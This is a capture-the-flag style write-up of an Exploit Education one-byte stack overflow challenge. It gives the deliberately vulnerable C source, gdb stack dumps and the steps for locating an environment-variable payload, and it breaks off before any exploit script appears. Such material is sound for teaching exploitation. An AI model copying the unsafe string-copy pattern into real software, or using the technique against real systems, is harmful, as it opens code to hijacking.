# Challenge Source Code
```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
    "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *what = GREET;

char *greet(char *who) {
    char buffer[128];
    int maxSize;

    maxSize = strlen(who);
    if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
}

    strcpy(buffer, what);
    strncpy(buffer + strlen(buffer), who, maxSize);

    return strdup(buffer);
}

int main(int argc, char **argv) {
    char *ptr;
    printf("%s\n", BANNER);

#ifdef NEWARCH
    if (argv[1]) {
        what = argv[1];
    }
#endif

    ptr = getenv("ExploitEducation");
    if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, "Please specify an environment variable called ExploitEducation");
    }

    printf("%s\n", greet(ptr));
    return 0;
}
```
# Challenge Theory
This challenge is a 1 byte buffer overflow.
You have overwrite a single byte and then point it to something to get code execution.
# Working on the Challenge
## Identifying the Exploit
Setting the environment variable "ExploitEducation" outside of gdb will be done.
Also the "GREET" macro simply creates the string "Welcome, I am pleased to meet you".
This has the length of 34.
The buffer for the challenge is 128, but only 127 bytes can be read in.
This means 34 + 127 = 161, and according the dissassembly there is a total 168 on the stack frame.
```
0x00000000004006fd <+0>:     push   rbp
0x00000000004006fe <+1>:     mov    rbp,rsp
0x0000000000400701 <+4>:     push   rbx
0x0000000000400702 <+5>:     sub    rsp,0xa8
```
All of this combined means only the least significant bit can actually be overwritten.
Therefore, this exploit needs to be a bit more creative.
Taking a look at the stack with a 127 byte payload it has:
```
gef➤  x/22xg $rbp-0xa0
0x7fffffffe4f0: 0x2c656d6f636c6557      0x6c70206d61204920
0x7fffffffe500: 0x6f74206465736165      0x6f79207465656d20
0x7fffffffe510: 0x4141414141412075      0x4141414141414141
0x7fffffffe520: 0x4141414141414141      0x4141414141414141
0x7fffffffe530: 0x4141414141414141      0x4141414141414141
0x7fffffffe540: 0x4141414141414141      0x4141414141414141
0x7fffffffe550: 0x4141414141414141      0x4141414141414141
0x7fffffffe560: 0x4141414141414141      0x4141414141414141
0x7fffffffe570: 0x4141414141414141      0x4141414141414141
0x7fffffffe580: 0x4141414141414141      0x4141414141414141
0x7fffffffe590: 0x00007fffffffe541      0x00000000004007e9
```
The least significat byte of the address at "0x7fffffffe590" is changed to "41".
Now there is one place to jump to where the user controls data, which would be the env variable "ExploitEducation".
Since env variables are at the bottom of the stack(the stack frame of the whole program) there must be a value in between 0x00007fffffffe501, and 0x00007fffffffe5ff to jump to.
## Finding the Env Variable
To find the env variable using the gef extension the command grep will be used. 
Simply running "grep ExploitEducation=" will net the output
``` 
gef➤  grep ExploitEducation=
[+] Searching 'ExploitEducation=' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffeeff - 0x7fffffffef36  →   "ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
```
There are few things to note here.
First, the address is at "0x7fffffffeeff", but the exploit actually needs the start of the user input and not the varialbe itself.
To find this simply using grep to search for the user payload works very quickly.
This nets the value "0x7fffffffef10". 
```
gef➤  grep AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Searching 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffe512 - 0x7fffffffe549  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]" 
  0x7fffffffef10 - 0x7fffffffef47  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]" 
```
# Writing the Exploit
## Getting Basic Code Execution
To test basic code execution there will be no shellcode, there will simply be a int3 call instead. 
A script will also be used to generate a payload.
